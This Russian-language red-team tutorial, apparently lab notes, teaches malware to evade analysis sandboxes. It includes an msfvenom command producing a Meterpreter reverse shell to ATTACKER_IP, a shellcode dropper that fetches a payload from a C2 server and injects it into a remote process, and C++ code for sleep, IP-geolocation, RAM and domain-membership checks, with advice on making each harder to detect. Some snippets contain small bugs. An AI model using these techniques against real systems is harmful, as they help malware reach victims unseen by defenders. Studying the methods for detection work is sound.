# Sandbox Evasion для Red Team

## Зачем это нужно

Malware Sandbox (например, Any.Run, VirusTotal Sandbox) — это изолированные среды, куда антивирусы и аналитики отправляют подозрительные бинарники. Они **ограничены по времени** (обычно 1–5 минут) и **по ресурсам** (1 CPU, 4 ГБ RAM), **не находятся в домене** и **расположены в дата-центрах** антивирусных компаний. Зная это, можно заставить вредонос **не выполняться** в песочнице, но **выполниться** на реальной цели.

Все техники делятся на **четыре категории** (от простых к сложным):

1. **Sleep** — тянуть время.
2. **Geolocation** — проверять IP.
3. **System Information** — проверять железо/ОС.
4. **Network Information** — проверять домен.


## 0. Базовый dropper (основа для всех техник)

Перед внедрением evasion нужен **базовый загрузчик**, который:

1. Скачивает raw-шеллкод с C2-сервера (`/index.raw`).
2. Выделяет память в **чужом процессе** (`OpenProcess` → `VirtualAllocEx`).
3. Записывает туда шеллкод (`WriteProcessMemory`).
4. Запускает его в отдельном потоке (`CreateRemoteThread`).

**Генерация шеллкода** (обязательно 64-bit, raw):

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f raw -o index.raw
```

**Хостинг:** `python3 -m http.server 8080` на AttackBox.

**Компиляция:** Visual Studio 2019+, **x64 Release**. В коде есть плейсхолдеры (размер шеллкода `dwSize`, PID Explorer, IP C2, размер буфера) — их надо заменить.


## 1. Sleep (самая простая техника)

**Идея:** песочница работает **ограниченное время** (например, 1 минута у Any.Run). Если «усыпить» программу дольше этого времени — шеллкод **не успеет** выполниться, и песочница покажет «чисто».

**Реализация:**

```cpp
int main() {
    sleep(120000);  // 120 секунд = 2 минуты
    downloadAndExecute();
    return 0;
}
```

**Результат:** в Any.Run **нет** запроса к C2 — программа «спит» и умирает вместе с таймером песочницы.

**Ограничение:** антивирусы научились **обходить стандартный `sleep`** (перехватывают вызовы, ускоряют время). Поэтому лучше:

- **Своя функция сна** (через `QueryPerformanceCounter` + цикл).
- **Тяжёлые вычисления** (например, Fibonacci) — занимают реальное CPU-время, которое песочница не может «промотать».


## 2. Geolocation (геоблокировка)

**Идея:** песочница **не в той стране/сети**, что цель. Если IP-адрес машины **не принадлежит** целевой организации (или принадлежит дата-центру AV-вендора) — не выполняем шеллкод.

**Реализация:**

```cpp
BOOL checkIP() {
    const char* websiteURL = "https://ifconfig.me/ip";
    IStream* stream;
    string s;
    char buff[35];
    unsigned long bytesRead;
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
    while (true) {
        stream->Read(buff, 35, &bytesRead);
        if (0U == bytesRead) break;
        s.append(buff, bytesRead);
    }
    if (s == "VICTIM_IP") return TRUE;
    else return FALSE;
}

int main() {
    if (checkIP() == TRUE) {
        downloadAndExecute();
    } else {
        cout << "HTTP/418 - I'm a Teapot!";
    }
    return 0;
}
```

**Как работает:**

1. `URLOpenBlockingStreamA` открывает HTTP-поток к `ifconfig.me/ip`.
2. Читает ответ (свой внешний IP).
3. Сравнивает с **IP жертвы** (нужно знать заранее).
4. Если совпало — выполняет шеллкод; иначе — «418 I'm a Teapot».

**Ограничение:** Any.Run **помечает** `ifconfig.me` как подозрительный и **снижает** оценку. Лучше **свой сервер** проверки IP (не публичный сервис).

**Реальный пример:** часто комбинируют с **RDAP/ARIN** (`rdap.arin.net`), чтобы узнать **ISP** и проверить, что это **резидентский** IP, а не дата-центр.


## 3. System Information (проверка ресурсов)

**Идея:** песочницы **слабые** (1 CPU, 4 ГБ RAM). Реальные рабочие станции — **мощнее** (2–8 CPU, 8–32 ГБ RAM). Проверяем ресурсы и **не запускаемся**, если их мало.

### 3.1. Проверка RAM

**Реализация:**

```cpp
BOOL memoryCheck() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    if (statex.ullTotalPhys / 1024 / 1024 / 1024 >= 5.00) {
        return TRUE;
    } else {
        return FALSE;
    }
}

int main() {
    if (memoryCheck() == TRUE) {
        downloadAndExecute();
    } else {
        exit;
    }
    return 0;
}
```

**Как работает:**

1. `MEMORYSTATUSEX statex;` — структура для данных о памяти.
2. `statex.dwLength = sizeof(statex);` — обязательный шаг (WinAPI требует знать размер).
3. `GlobalMemoryStatusEx(&statex);` — заполняет структуру.
4. `ullTotalPhys / 1024³` → гигабайты.
5. Если `>= 5` — продолжаем; иначе — выход.

**Результат:** в Any.Run (4 ГБ) программа **вышла**, не сделав запрос к C2.

### 3.2. Что ещё можно проверять

- **Количество CPU-ядер** (`GetSystemInfo`).
- **Размер диска** (`GetDiskFreeSpaceEx`).
- **Серийный номер диска**.
- **Hostname**.
- **Версия Windows / Product Key**.
- **MAC-адрес сетевой карты**.
- **Признаки виртуализации** (VMware/VirtualBox).
- **Текущий пользователь**.


## 4. Network Information (проверка домена)

**Идея:** песочницы **почти никогда не в домене Active Directory**. Если машина **не в домене** — это не цель.

### 4.1. Проверка через `NetGetDCName`

```cpp
BOOL isDomainController() {
    LPCWSTR dcName;
    NetGetDCName(NULL, NULL, (LPBYTE *) &dcName);
    wstring ws(dcName);
    string dcNewName(ws.begin(), ws.end());
    if (dcNewName.find("\\\\") != string::npos) {
        return TRUE;
    } else {
        return FALSE;
    }
}

int main() {
    if (isDomainController == TRUE) {
        downloadAndExecute();
    } else {
        cout << "Domain Controller Not Found!";
    }
}
```

**Как работает:**

1. `NetGetDCName(NULL, NULL, ...)` — ищет **контроллер домена** в текущем окружении.
2. Возвращает **UNC-путь** (`\\DC01\...`) в виде wide-строки.
3. Конвертирует `LPCWSTR` → `string`.
4. Ищет `\\` в пути. Если есть — **домен присутствует**, значит, это реальная цель.

**Важно:** нужно **добавить `Netapi32.lib`** в проект:

- **Solution Explorer** → правый клик по проекту → **Properties**.
- **Linker** → **Input** → **Additional Dependencies** → добавить `Netapi32.lib`.
- **Apply** → **OK**.

**Результат:** в VirusTotal Sandbox запроса к C2 **нет** — машина не в домене, шеллкод не выполняется.

### 4.2. Что ещё можно проверять

- **Список компьютеров в домене**.
- **Учётные записи пользователей**.
- **Last User Login**.
- **Группы** (`Domain Admins`, `Enterprise Admins`).
- **Domain Controllers**.
- **Service Accounts**.
- **Серверы**.

**Более простой способ** (без WinAPI):

- Переменные окружения: `echo %LOGONSERVER%`, `%LOGONUSER%`, `%LOGONUSERNAME%`, `%LOGONDOMAIN%`.


## Сводная таблица

| Техника | Что проверяем | Как | Что делаем при «песочнице» |
|---|---|---|---|
| **Sleep** | время работы | `sleep(120000)` или тяжёлая математика | не выполняем шеллкод |
| **Geolocation** | IP-адрес | `ifconfig.me/ip` + сравнение | «418 I'm a Teapot» |
| **System Info** | RAM/CPU/диск | `GlobalMemoryStatusEx` | выход |
| **Network Info** | наличие домена | `NetGetDCName` | «Domain Controller Not Found» |


## Ключевые предупреждения

1. **Sleep может быть обойдён** — AV-вендоры ускоряют стандартные `sleep`. Используй **свою** функцию сна или тяжёлые вычисления.
2. **Публичные IP-сервисы (`ifconfig.me`) детектируются** — Any.Run помечает их как подозрительные. Лучше **свой** сервер.
3. **Не все техники одинаково полезны** — некоторые **снижают** score (геолокация через публичный сервис), некоторые **повышают** (sleep, domain check).
4. **Комбинируй техники** — одна проверка обходится легко, несколько — значительно сложнее.


## Итог

Sandbox Evasion — это **не про обход антивируса**, а про **обход песочницы**: заставить вредонос **не выполняться** в изолированной среде аналитика. Четыре категории — **Sleep, Geolocation, System Info, Network Info** — покрывают основные векторы. Реализация — на C++ через WinAPI (`GlobalMemoryStatusEx`, `NetGetDCName`, `URLOpenBlockingStreamA`) + Visual Studio 2019 x64. Главное — **не переусердствовать**: некоторые техники (публичный IP-чек) делают хуже, чем помогают.